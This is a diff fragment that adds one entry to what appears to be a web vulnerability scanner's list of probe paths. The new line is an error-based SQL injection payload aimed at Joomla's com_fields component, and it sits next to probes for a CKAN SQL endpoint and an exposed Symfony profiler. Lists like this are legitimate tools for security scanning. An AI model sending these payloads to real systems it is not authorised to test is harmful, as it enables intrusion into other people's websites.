@@ -816,3 +816,4 @@
 /api/action/status_show
 /api/action/datastore_search_sql?sql=SELECT+ts_rewrite(
 /_profiler/phpinfo?+--env=dev
+/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5({{num}})),1)
